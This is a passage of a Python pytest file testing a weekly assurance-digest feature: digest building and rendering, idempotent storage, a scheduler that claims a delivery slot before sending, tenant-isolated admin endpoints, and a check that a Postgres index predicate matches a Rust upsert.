                category="check_breach", severity="critical",
                fingerprint="check_breach:chk-x:v1", title="Check breached: cost",
                evidence={}, occurrence_count=7,
                first_seen_at=mid_week, last_seen_at=mid_week,
                state="open",
            )
        )
        s.commit()

    def test_build_digest_projects_the_week(self, harness):
        week_start = date(2026, 8, 24)
        s = harness.Factory()
        self._seed_estate(s, week_start)
        content = build_digest(s, "t1", week_start)
        assert content["week_start"] == "2026-08-24"
        assert content["totals"]["systems"] == 1
        assert content["totals"]["runs"] == 1
        assert content["totals"]["cost_usd"] == 1.25
        assert content["totals"]["items_raised"] == 1
        assert content["totals"]["open_critical"] == 1
        system = content["systems"][0]
        assert system["name"] == "Support Copilot"
        assert system["health_state"] == "degraded"
        assert content["top_check_breaches"][0]["occurrences"] == 7

        # Renderers accept the stored shape.
        slack = render_digest_slack(content)
        assert f"week of {week_start}" in slack["text"]
        webhook = render_digest_webhook(content)
        assert webhook["type"] == "assurance.digest_weekly"
        assert webhook["digest"]["totals"]["runs"] == 1
        s.close()

    def test_store_is_idempotent(self, harness):
        s = harness.Factory()
        week = date(2026, 8, 24)
        assert store_digest(s, "t1", week, {"x": 1}) is not None
        s.commit()
        assert store_digest(s, "t1", week, {"x": 2}) is None
        s.close()

    def test_scheduler_sends_once_per_subscription(self, harness, monkeypatch):
        week_start = date(2026, 8, 24)
        s = harness.Factory()
        self._seed_estate(s, week_start)
        channel = NotificationChannel(
            id=f"nchan-{ULID()}", tenant_id="t1", name="ops",
            kind="slack_webhook",
            config_encrypted="enc:" + json.dumps(
                {"webhook_url": "https://hooks.slack.com/services/T/B/x"}
            ),
            enabled=True,
        )
        s.add(channel)
        s.flush()
        sub = NotificationSubscription(
            id=f"nsub-{ULID()}", tenant_id="t1", channel_id=channel.id,
            event_class="digest_weekly", severity_floor="info",
            coalesce_seconds=900, enabled=True,
        )
        s.add(sub)
        s.commit()

        deliverer = RecordingDeliverer()
        dispatcher = NotificationDispatcher(FakeEncryption(), deliverer)
        monkeypatch.setattr(assurance_digest_scheduler, "_dispatcher", dispatcher)

        now = datetime(2026, 8, 31, 9, 0, tzinfo=timezone.utc)
        sent = assurance_digest_scheduler._run(s, now)
        assert sent == 1
        assert len(deliverer.posts) == 1
        payload = json.loads(deliverer.posts[0][1])
        assert "Weekly assurance digest" in payload["text"]

        digest_row = s.query(AssuranceDigest).one()
        assert digest_row.week_start == week_start
        delivery = s.query(NotificationDelivery).one()
        assert delivery.status == "sent"
        assert delivery.fingerprint == "digest_weekly:2026-08-24"
        assert delivery.inbox_event_id == digest_row.id

        # Second tick: same week, nothing new.
        sent = assurance_digest_scheduler._run(s, now + timedelta(minutes=5))
        assert sent == 0
        assert s.query(NotificationDelivery).count() == 1
        s.close()

    def test_scheduler_claims_before_delivering(self, harness, monkeypatch):
        """A slot already claimed by another worker sends nothing.

        The old shape SELECTed, sent, then INSERTed — so the unique index
        `uq_ndel_subscription_event` caught the duplicate row but only
        after the subscriber had already been emailed twice. Standing in
        for the concurrent worker with a pre-inserted `pending` claim: the
        deliverer must not be called at all.
        """
        week_start = date(2026, 8, 24)
        s = harness.Factory()
        self._seed_estate(s, week_start)
        channel = NotificationChannel(
            id=f"nchan-{ULID()}", tenant_id="t1", name="ops",
            kind="slack_webhook",
            config_encrypted="enc:" + json.dumps(
                {"webhook_url": "https://hooks.slack.com/services/T/B/x"}
            ),
            enabled=True,
        )
        s.add(channel)
        s.flush()
        sub = NotificationSubscription(
            id=f"nsub-{ULID()}", tenant_id="t1", channel_id=channel.id,
            event_class="digest_weekly", severity_floor="info",
            coalesce_seconds=900, enabled=True,
        )
        s.add(sub)
        s.commit()

        # Build and store the digest the way the first worker would, then
        # claim the slot on its behalf.
        content = build_digest(s, "t1", week_start)
        digest_row = store_digest(s, "t1", week_start, content)
        s.add(
            NotificationDelivery(
                id=f"ndel-{ULID()}", tenant_id="t1",
                subscription_id=sub.id, channel_id=channel.id,
                inbox_event_id=digest_row.id, inbox_item_id=digest_row.id,
                fingerprint=f"digest_weekly:{week_start.isoformat()}",
                status="pending", attempts=5,
            )
        )
        s.commit()

        deliverer = RecordingDeliverer()
        dispatcher = NotificationDispatcher(FakeEncryption(), deliverer)
        monkeypatch.setattr(assurance_digest_scheduler, "_dispatcher", dispatcher)

        now = datetime(2026, 8, 31, 9, 0, tzinfo=timezone.utc)
        sent = assurance_digest_scheduler._run(s, now)

        assert sent == 0
        assert deliverer.posts == []
        assert s.query(NotificationDelivery).count() == 1
        # The loser leaves the claim exactly as it found it.
        assert s.query(NotificationDelivery).one().status == "pending"
        s.close()

    def test_pending_is_an_accepted_delivery_status(self, harness):
        """`ck_ndel_status` has to have room for the claim (a173_ndel_pending)."""
        from app.database.models.notification_channel import DELIVERY_STATUSES

        assert "pending" in DELIVERY_STATUSES

    def test_digest_build_does_not_scale_queries_with_system_count(self, harness):
        """CP-17. The builder used to issue four aggregates per AI System
        inside the loop, so a 20-system estate was 80 round trips — and
        this is reachable interactively from the preview endpoint, not
        just from the weekly loop."""
        from sqlalchemy import event

        week_start = date(2026, 8, 24)
        s = harness.Factory()
        self._seed_estate(s, week_start)
        for n in range(2, 8):
            s.add(ResourceGroup(
                id=f"sys-{n}", tenant_id="t1", name=f"System {n}",
                group_type=GroupType.AI_SYSTEM.value, hierarchy_level=0,
                is_active=True,
            ))
        s.commit()

        statements = []

        def record(conn, cursor, statement, params, context, executemany):
            statements.append(statement)

        engine = s.get_bind()
        event.listen(engine, "before_cursor_execute", record)
        try:
            content = build_digest(s, "t1", week_start)
        finally:
            event.remove(engine, "before_cursor_execute", record)
        s.close()

        assert len(content["systems"]) == 7
        # Systems + health + four estate-wide GROUP BYs + the tenant-level
        # rollups. Comfortably under seven systems x four.
        assert len(statements) <= 15, (
            f"{len(statements)} queries for 7 systems — the per-system loop "
            f"is back:\n" + "\n".join(statements)
        )

    def test_digest_endpoints(self, harness):
        week_start = date(2026, 8, 24)
        s = harness.Factory()
        self._seed_estate(s, week_start)
        content = build_digest(s, "t1", week_start)
        store_digest(s, "t1", week_start, content)
        s.commit()
        s.close()

        headers = harness.login("t1")
        listed = harness.client.get(
            "/v1/admin/assurance-digest", headers=headers
        ).json()
        assert listed["total"] == 1
        assert listed["digests"][0]["week_start"] == "2026-08-24"
        assert listed["digests"][0]["content"]["totals"]["runs"] == 1

        # Cross-tenant: t2 sees nothing.
        other = harness.client.get(
            "/v1/admin/assurance-digest", headers=harness.login("t2")
        ).json()
        assert other["total"] == 0

        preview = harness.client.post(
            "/v1/admin/assurance-digest/preview", headers=headers
        )
        assert preview.status_code == 200
        assert "totals" in preview.json()


# ── the arbiter-predicate contract ──────────────────────────────────────


class TestIndexPredicateContract:
    """`uq_ckr_check_version_run` is an ARBITER, not just an index.

    The Rust core's result upsert names this predicate in its
    `ON CONFLICT ... WHERE`, and Postgres picks the arbiter index by proving
    the statement's predicate implies the index's. That prover does not
    equate `NOT backtest` with `backtest IS FALSE`, so the three spellings
    have to match textually or the follower dies at runtime — on FRESH
    installs only, because those build the schema from these models while
    upgrades build it from the migration. Check evaluation is fail-open, so
    the symptom was checks that stayed green and recorded nothing.
    """

    def _pg_where(self) -> str:
        from sqlalchemy.dialects import postgresql
        from sqlalchemy.schema import CreateIndex

        for ix in AssuranceCheckResult.__table__.indexes:
            if ix.name == "uq_ckr_check_version_run":
                ddl = str(CreateIndex(ix).compile(dialect=postgresql.dialect()))
                return ddl.split(" WHERE ", 1)[1].strip()
        raise AssertionError("uq_ckr_check_version_run is missing from the model")


    def test_core_upsert_infers_the_same_predicate(self):
        from tests.core_repo import core_source

        # Skipped without BRUTOR_CORE_REPO (`tests/core_repo.py`).
        src = core_source("services", "assurance_checks.rs").read_text()
        assert "ON CONFLICT (check_id, check_version, run_id)" in src
        where = src.split("ON CONFLICT (check_id, check_version, run_id)", 1)[1]
        where = where.split("DO UPDATE", 1)[0]
        normalised = " ".join(where.replace("WHERE", "", 1).split())
        assert normalised == self._pg_where(), (
            f"core infers `{normalised}` but the index is "
            f"`{self._pg_where()}` — Postgres will refuse the arbiter"
        )
